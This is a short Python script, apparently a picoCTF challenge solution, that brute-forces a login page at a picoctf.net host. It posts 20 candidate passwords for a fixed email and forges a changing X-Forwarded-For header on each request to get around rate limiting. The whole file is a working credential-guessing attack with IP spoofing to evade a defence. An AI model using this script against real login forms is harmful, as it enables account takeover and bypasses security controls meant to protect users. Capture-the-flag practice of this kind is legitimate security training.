import requests

passwords = [  # List of possible passwords
    "l9xKfsH0",
    "rCRnekkE",
    "wqMh5SQT",
    "9JL7BM3W",
    "OtrkErZU",
    "xr5N5yun",
    "FAfQ34Dr",
    "xAzOtoGy",
    "NT4Vm1FC",
    "aRhrp17j",
    "5vcxz5xZ",
    "SooyOtMf",
    "qpTlHqaG",
    "0AwkENeB",
    "tfkwkm3g",
    "UToyxdBs",
    "NWj5rDBm",
    "LiVR9e3g",
    "3v6avTIP",
    "jcEoe8hx"
]

for (i,item) in enumerate(passwords, start=1):
    payload = {"email":"ctf-player@picoctf.org","password":item}
    header = {"X-Forwarded-For": "8.8.8" + str(i)} # Varying the last octet to bypass rate limiting
    login_page = 'http://amiable-citadel.picoctf.net:54442/login'
    r = requests.post(url=login_page,headers=header, data=payload)
    print("URL:", r.request.url)
    print("Method:", r.request.method)
    print("Headers:", r.request.headers)
    print("Body:", r.request.body)
    print("Status:", r.status_code)
    print("Response:", r.text)
    print("-" * 40)
